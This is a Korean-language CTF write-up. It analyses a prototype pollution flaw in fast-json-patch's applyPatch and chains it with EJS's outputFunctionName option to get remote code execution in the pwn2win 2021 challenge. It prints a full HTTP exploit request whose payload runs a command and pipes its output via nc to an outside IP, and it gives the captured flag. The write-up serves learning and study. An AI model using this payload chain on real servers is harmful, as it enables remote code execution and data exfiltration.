## TR;DL

> Prototype Pollution

---
## Analysis : Introduce

![](https://github.com/wjddnjs33/image/blob/main/prototype/prototype1.png?raw=true)

위 사진을 보면 `fast-json-patch` 모듈의 `applyPatch()` 메서드를 이용해서 a라는 메서드를 패치 시켜주는데, 이때 내부 오퍼레이션에 의해서 `Prototype Pollution` 취약점이 발생한다. 인자로는 2개의 값을 보내주는 것을 볼 수 있다. 첫 번째 인자는 패치할 주체가 들어가고, 두 번째 인자로는 패치의 적용할 데이터를 `Json` 형식으로 보내는 것을 볼 수 있고, 이 두 번째 인자에서 두 번째 값인 `path` 키의 대해서 `Prototype Pollution` 취약점이 발생한다.

---
## Analysis : applyPatch()

```js
function applyPatch(document, patch, validateOperation, mutateDocument, banPrototypeModifications) {
    if (mutateDocument === void 0) { mutateDocument = true; }
    if (banPrototypeModifications === void 0) { banPrototypeModifications = true; }
    if (validateOperation) {
        if (!Array.isArray(patch)) {
            throw new exports.JsonPatchError('Patch sequence must be an array', 'SEQUENCE_NOT_AN_ARRAY');
        }
    }
    if (!mutateDocument) {
        document = helpers_js_1._deepClone(document);
    }
    var results = new Array(patch.length);
    for (var i = 0, length_1 = patch.length; i < length_1; i++) {
        // we don't need to pass mutateDocument argument because if it was true, we already deep cloned the object, we'll just pass `true`
        results[i] = applyOperation(document, patch[i], validateOperation, true, banPrototypeModifications, i);
        document = results[i].newDocument; // in case root was replaced
    }
    results.newDocument = document;
    return results;
}
```
`applyPatch()` 메서드는 `core.js` 파일에 정의가 되어 있다. 코드를 보면 중간 부분에 `patch` 배열을 `for` 문으로 돌려가며 하나씩 `applyOperation()` 메서드의 두 번째 인자로 넘겨주는 것을 볼 수 있고, 첫 번째 인자는 당연 우리가 보내준 패치 될 주체이다. 여 기서 `patch`는 우리가 위에서 `applyPatch()` 함수에 넘겨준 두 번째 인자값이 된다.

`applyOperation()` 메서드를 호출하는 것을 보면 우리가 보낸 패치 파일을 다중으로 적용하는 것이 아닌 단일로 하나씩 적용하는 것으로 보인다.

---
## Analsys : applyOperation()

```js
function applyOperation(document, operation, validateOperation, mutateDocument, banPrototypeModifications, index) {
    if (validateOperation === void 0) { validateOperation = false; }
    if (mutateDocument === void 0) { mutateDocument = true; }
    if (banPrototypeModifications === void 0) { banPrototypeModifications = true; }
    if (index === void 0) { index = 0; }
    if (validateOperation) {
        if (typeof validateOperation == 'function') {
            validateOperation(operation, 0, document, operation.path);
        }
        else {
            validator(operation, 0);
        }
    }
    /* ROOT OPERATIONS */
    if (operation.path === "") {
        var returnValue = { newDocument: document };
        if (operation.op === 'add') {
        ...
    else {
        if (!mutateDocument) {
            document = helpers_js_1._deepClone(document);
        }
        var path = operation.path || "";
        var keys = path.split('/');
        var obj = document;
        var t = 1; //skip empty element - http://jsperf.com/to-shift-or-not-to-shift
        var len = keys.length;
        var existingPathFragment = undefined;
        var key = void 0;
        var validateFunction = void 0;
        if (typeof validateOperation == 'function') {
            validateFunction = validateOperation;
        }
        else {
            validateFunction = validator;
        }
        while (true) {
            key = keys[t];
            if (banPrototypeModifications && key == '__proto__') {
                throw new TypeError('JSON-Patch: modifying `__proto__` prop is banned for security reasons, if this was on purpose, please set `banPrototypeModifications` flag false and pass it to this function. More info in fast-json-patch README');
            }
            if (validateOperation) {
                if (existingPathFragment === undefined) {
                    if (obj[key] === undefined) {
                        existingPathFragment = keys.slice(0, t).join('/');
                    }
                    else if (t == len - 1) {
                        existingPathFragment = operation.path;
                    }
                    if (existingPathFragment !== undefined) {
                        validateFunction(operation, 0, document, existingPathFragment);
                    }
                }
            }
            t++;
            if (Array.isArray(obj)) {
                if (key === '-') {
                    key = obj.length;
                }
                else {
                    if (validateOperation && !helpers_js_1.isInteger(key)) {
                        throw new exports.JsonPatchError("Expected an unsigned base-10 integer value, making the new referenced value the array element with the zero-based index", "OPERATION_PATH_ILLEGAL_ARRAY_INDEX", index, operation, document);
                    } // only parse key when it's an integer for `arr.prop` to work
                    else if (helpers_js_1.isInteger(key)) {
                        key = ~~key;
                    }
                }
                if (t >= len) {
                    if (validateOperation && operation.op === "add" && key > obj.length) {
                        throw new exports.JsonPatchError("The specified index MUST NOT be greater than the number of elements in the array", "OPERATION_VALUE_OUT_OF_BOUNDS", index, operation, document);
                    }
                    var returnValue = arrOps[operation.op].call(operation, obj, key, document); // Apply patch
                    if (returnValue.test === false) {
                        throw new exports.JsonPatchError("Test operation failed", 'TEST_OPERATION_FAILED', index, operation, document);
                    }
                    return returnValue;
                }
            }
            else {
                if (key && key.indexOf('~') != -1) {
                    key = helpers_js_1.unescapePathComponent(key);
                }
                if (t >= len) {
                    var returnValue = objOps[operation.op].call(operation, obj, key, document); // Apply patch
                    if (returnValue.test === false) {
                        throw new exports.JsonPatchError("Test operation failed", 'TEST_OPERATION_FAILED', index, operation, document);
                    }
                    return returnValue;
                }
            }
            obj = obj[key];
        }
    }
}
```
`applyOperation()` 메서드를 보면 중간에 슬래쉬를 이용해서 `path` 값을 스플릿하는 것을 볼 수 있다. 우리는 path의 값으로 `"/constructor/prototype/polluted"`와 같이 주었기 때문에 keys의 값은 `['constructor', 'prototype', 'polluted']`가 된다.

이렇게 값을 스플릿 해준 후에 keys.length만큼 와일문을 돌린다. 이때 `keys` 값으로 `__proto__`가 들어오면 `JSON-Patch: modifying '__proto__' prop is banned for security reasons, if this was on purpose, please set 'banPrototypeModifications' flag false and pass it to this function. More info in fast-json-patch READM`와 같은 구문을 출력하고 끝내는 것을 볼 수 있다. 아마도 `Prototype Pollution`을 방지한 것 같다.

![](https://github.com/wjddnjs33/image/blob/main/prototype/%5B1.png?raw=true)

하지만 `__proto__` 프로퍼티와 `constructor.prototype` 프로퍼티는 동일하기 때문에 이를 이용해서 `Prototype Pollution` 공격을 할 수 있다.

와일문을 돌면서 if 문을 이용해서 조건에 맞는 오퍼레이션을 하는 것으로 보인다.

- 첫 번째 조건은 일단 key의 값으로 `__proto__`가 존재하지 않아야 한다.
- 두 번째 조건은 `validateOperation`의 값이 참이어야 한다.
- 세 번째 조건은 우리가 전달해준 패치가 될 주체가 `Array`여야 한다.

```js
            else {
                if (key && key.indexOf('~') != -1) {
                    key = helpers_js_1.unescapePathComponent(key);
                }
                if (t >= len) {
                    var returnValue = objOps[operation.op].call(operation, obj, key, document); // Apply patch
                    if (returnValue.test === false) {
                        throw new exports.JsonPatchError("Test operation failed", 'TEST_OPERATION_FAILED', index, operation, document);
                    }
                    return returnValue;
                }
            }
```
위 세 가지지 조건을 모두 위배할 경우에는 위 코드가 실행이 된다. 일단 우리는 `patch`의 값으로 `~`가 들어간 곳이 없기 때문에 3번 모두 else문이 실행이 될 것 이다. else 문을 보면 `objOps`를 이용해서 패치를 하는 것을 볼 수 있고, 인자로는 연산자, 패치 될 주체, 패치할 값, 패치 될 주체를 넘겨주고 있는 것을 볼 수 있다. 여기서 우리는 연산자를 넘겨줄 때, `replace`를 넘겨주었다.

---
## Analysis : objOps

```js
var objOps = {
    add: function (obj, key, document) {
        obj[key] = this.value;
        return { newDocument: document };
    },
    remove: function (obj, key, document) {
        var removed = obj[key];
        delete obj[key];
        return { newDocument: document, removed: removed };
    },
    replace: function (obj, key, document) {
        var removed = obj[key];
        obj[key] = this.value;
        return { newDocument: document, removed: removed };
    },
    move: function (obj, key, document) {
        /* in case move target overwrites an existing value,
        return the removed value, this can be taxing performance-wise,
        and is potentially unneeded */
        var removed = getValueByPointer(document, this.path);
        if (removed) {
            removed = helpers_js_1._deepClone(removed);
        }
        var originalValue = applyOperation(document, { op: "remove", path: this.from }).removed;
        applyOperation(document, { op: "add", path: this.path, value: originalValue });
        return { newDocument: document, removed: removed };
    },
    copy: function (obj, key, document) {
        var valueToCopy = getValueByPointer(document, this.from);
        // enforce copy by value so further operations don't affect source (see issue #177)
        applyOperation(document, { op: "add", path: this.path, value: helpers_js_1._deepClone(valueToCopy) });
        return { newDocument: document };
    },
    test: function (obj, key, document) {
        return { newDocument: document, test: _areEquals(obj[key], this.value) };
    },
    _get: function (obj, key, document) {
        this.value = obj[key];
        return { newDocument: document };
    }
};
```
`objOps`를 보면 내부에 여러 함수들이 정의되어 있는 것을 볼 수 있다. `키:값`을 추가, 삭제, 리플레이스, 이동, 복사 등 등을 할 수 있는 것으로 보이고, 무엇을 실행할 지는 `objOps`에 인자로 넘어온 값을  통해서 판단하고 있다.

우리는 연산자로 `replace`를 보냈다.


```js
    replace: function (obj, key, document) {
        var removed = obj[key];
        obj[key] = this.value;
        return { newDocument: document, removed: removed };
    },
```
`replace()` 메서드를 확인해보면 key의 값을 `value`를 넣어주고 있는 것을 볼 수 있고, 바로 여기서 `Prototype Pollution` 취약점이 발생한다.

```js
const a = {};
const patch = [{op: "replace", path: "/constructor/prototype/polluted", value: "Prototype Pollution"}];
fastjsonpatch.applyPatch(a, patch);
```
우리는 위처럼 `path` 값을 전송을 했다. 그러니 내부 오퍼레이션에 의해서 와일문을 돌고, 제일 마지막 번째에서는 마치 `a['constructor']['prototype']['polluted']`와 같이 작동을 하게 되어 `Prototype Pollution`이 발생한다.

---
## Exploit (Web) pwn2win CTF 2021 [152 pts]

이번 주말에는 `pwn2win CTF 2021`이라는 대회가 열렸는데 해당 대회에서 웹 문제 중에 솔브가 제일 많은 문제가 `Prototype Pollution to RCE in ejs`를 이용한 문제였다. 하지만 삽질 실수를 해서 `Prototype Pollution` 공격을 하지 못 했고, 대회가 끝나고 롸업을 본 후에 `npm` 공식 사이트를 보니 거의 중간에 답이 있어서 매우 아쉬운 문제다.

```
FROM node:alpine

EXPOSE 1337

# copy flag
COPY flag.txt /root/flag.txt

# copy readflag binary (it just reads the flag)
COPY readflag /
RUN chmod 4755 /readflag

# install web application
COPY src /app
RUN cd /app && npm install

# change to guest user
USER 405

# run application and stay alive for 5 minutes
COPY entrypoint.sh /
ENTRYPOINT /entrypoint.sh
```
도커 파일을 확인해보면 `/readflag`라는 바이너리 파일을 실행 시키면 될 거 같다.


```js
const express = require('express')
const bodyParser = require('body-parser')
const jsonpatch = require('fast-json-patch')
const ejs = require('ejs')
const basicAuth = require('express-basic-auth')


const app = express()

// Middlewares //
app.use(bodyParser.json())
app.use(basicAuth({
    users: { "admin": process.env.SECRET || "admin" },
    challenge: true
}))

/////////////////

let services = {
    status: "online",
    cameras: "online",
    doors: "online",
    dome: "online",
    turrets: "online"
}

// Static folder
app.use("/static", express.static(__dirname + "/static"));

// Homepage
app.get("/", async (req, res) => {
    const html = await ejs.renderFile(__dirname + "/templates/index.ejs", {services})
    res.end(html)
})

// API
app.post("/change_status", (req, res) => {

    let patch = []

    Object.entries(req.body).forEach(([service, status]) => {

        if (service === "status"){
            res.status(400).end("Cannot change all services status")
            return
        }

        patch.push({
            "op": "replace",
            "path": "/" + service,
            "value": status
        })
    });

    jsonpatch.applyPatch(services, patch)

    if ("offline" in Object.values(services)){
        services.status = "offline"
    }

    res.json(services)
})

app.listen(1337, () => {
    console.log(`App listening at port 1337`)
})
```
서버 측 코드를 확인해보면 `/change_status`에서 json으로 값을 받아와서 patch 배열에 입력값을 푸쉬한 후에 `applyPatch()` 메서드에 인자로 넘겨주는 것을 볼 수 있다. 이 뒤로는 위 분석을 통해 충분히 확인하였으니 따로 부연 설명은 생략.

그럼 `Prototype Pollution`은 성공했지만 RCE를 어떻게 발생시켜야 할 지 확인 해야한다.

```js
// Homepage
app.get("/", async (req, res) => {
    const html = await ejs.renderFile(__dirname + "/templates/index.ejs", {services})
    res.end(html)
})
```
index를 보면 ejs의 `renderFile()` 메서드를 이용해서 템플릿을 반환하는 것을 볼 수 있다.

```js
exports.renderFile = function () {
  var args = Array.prototype.slice.call(arguments);
  var filename = args.shift();
  var cb;
  var opts = {filename: filename};
  var data;
  var viewOpts;

  // Do we have a callback?
  if (typeof arguments[arguments.length - 1] == 'function') {
    cb = args.pop();
  }
  // Do we have data/opts?
  if (args.length) {
    // Should always have data obj
    data = args.shift();
    // Normal passed opts (data obj + opts obj)
    if (args.length) {
      // Use shallowCopy so we don't pollute passed in opts obj with new vals
      utils.shallowCopy(opts, args.pop());
    }
    // Special casing for Express (settings + opts-in-data)
    else {
      // Express 3 and 4
      if (data.settings) {
        // Pull a few things from known locations
        if (data.settings.views) {
          opts.views = data.settings.views;
        }
        if (data.settings['view cache']) {
          opts.cache = true;
        }
        // Undocumented after Express 2, but still usable, esp. for
        // items that are unsafe to be passed along with data, like `root`
        viewOpts = data.settings['view options'];
        if (viewOpts) {
          utils.shallowCopy(opts, viewOpts);
        }
      }
      // Express 2 and lower, values set in app.locals, or people who just
      // want to pass options in their data. NOTE: These values will override
      // anything previously set in settings  or settings['view options']
      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
    }
    opts.filename = filename;
  }
  else {
    data = {};
  }

  return tryHandleCache(opts, data, cb);
};
```
`renderFile()` 메서드 하단을 보면 `tryHandleCache()` 메서드를 호출하는 것을 볼 수 있다.

```js
function tryHandleCache(options, data, cb) {
  var result;
  if (!cb) {
    if (typeof exports.promiseImpl == 'function') {
      return new exports.promiseImpl(function (resolve, reject) {
        try {
          result = handleCache(options)(data);
          resolve(result);
        }
        catch (err) {
          reject(err);
        }
      });
    }
    else {
      throw new Error('Please provide a callback function');
    }
  }
  else {
    try {
      result = handleCache(options)(data);
    }
    catch (err) {
      return cb(err);
    }

    cb(null, result);
  }
}
```
`tryHandleCache()` 메서드에서는 `handleCache()` 메서드를 호출하는 것을 볼 수 있다.

```js
function handleCache(options, template) {
  var func;
  var filename = options.filename;
  var hasTemplate = arguments.length > 1;

  if (options.cache) {
    if (!filename) {
      throw new Error('cache option requires a filename');
    }
    func = exports.cache.get(filename);
    if (func) {
      return func;
    }
    if (!hasTemplate) {
      template = fileLoader(filename).toString().replace(_BOM, '');
    }
  }
  else if (!hasTemplate) {
    // istanbul ignore if: should not happen at all
    if (!filename) {
      throw new Error('Internal EJS error: no file name or template '
                    + 'provided');
    }
    template = fileLoader(filename).toString().replace(_BOM, '');
  }
  func = exports.compile(template, options);
  if (options.cache) {
    exports.cache.set(filename, func);
  }
  return func;
}
```
`handleCache()` 메서드에서는 `export.compile()` 메서드를 또 호출한다.

```js
exports.compile = function compile(template, opts) {
  var templ;

  // v1 compat
  // 'scope' is 'context'
  // FIXME: Remove this in a future version
  if (opts && opts.scope) {
    if (!scopeOptionWarned){
      console.warn('`scope` option is deprecated and will be removed in EJS 3');
      scopeOptionWarned = true;
    }
    if (!opts.context) {
      opts.context = opts.scope;
    }
    delete opts.scope;
  }
  templ = new Template(template, opts);
  return templ.compile();
};
```
`export.compile()` 메서드에서는 `Tempalte()`이라는 객체를 생성자를 이용해서 생성하고, 생성한 템플릿 객체로 `compile()` 메서드를 실행하는 것을 볼 수 있다. ejs 모듈 내부는 처음보는데 아마 이 `Template()` 객체가 웹 프론트 단에 출력되는 부분인 거 같다.


```js
  compile: function () {
    /** @type {string} */
    ...
    if (!this.source) {
      this.generateSource();
      prepended +=
        '  var __output = "";\n' +
        '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
      if (opts.outputFunctionName) {
        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
      }
    ...
```
`compile()` 메서드를 확인 해보면 `outputFunctionName`을 이용해서 문자열을 만드는 것을 볼 수 있다. 즉, 우리는 `applyPatch()`에서 발생하는 `Prototype Pollution` 취약점을 이용해서 `compile()` 메서드에서 사용되는 `outputFunctionName` 값을 잘 조작해 문자열을 맞춰 RCE를 발생시켜야 한다.

```
POST /change_status HTTP/1.1
Host: illusion.pwn2win.party:44211
Cache-Control: max-age=0
Authorization: Basic YWRtaW46cXp0bG5mdXlzZXVxeWpmaQ==
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: _ga=GA1.2.687081227.1622238128; _gid=GA1.2.492571223.1622429990
Content-Type: application/json
Connection: close
Content-Length: 155

{
    "constructor/prototype/outputFunctionName": "_; process.mainModule.require('child_process').execSync('./readflag | nc 141.164.52.207 80');//"
}
```
그래서 위와 같이 값을 보내 `Prototype Pollution`을 이용해서 `outputFunctionName`의 값을 `value` 값으로 오염을 시켜주었다.


![](https://github.com/wjddnjs33/image/blob/main/prototype/flag.png?raw=true)

그리고 index 페이지로 접속을 하게 되면 `ejs.renderFile()` 메서드가 실행 될 때, 이미 `outputFunctionName`의 값이 js exploit code로 오염이 되어 있어 RCE가 발생해 플래그를 얻을 수 있었다.

```
CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}
```

---
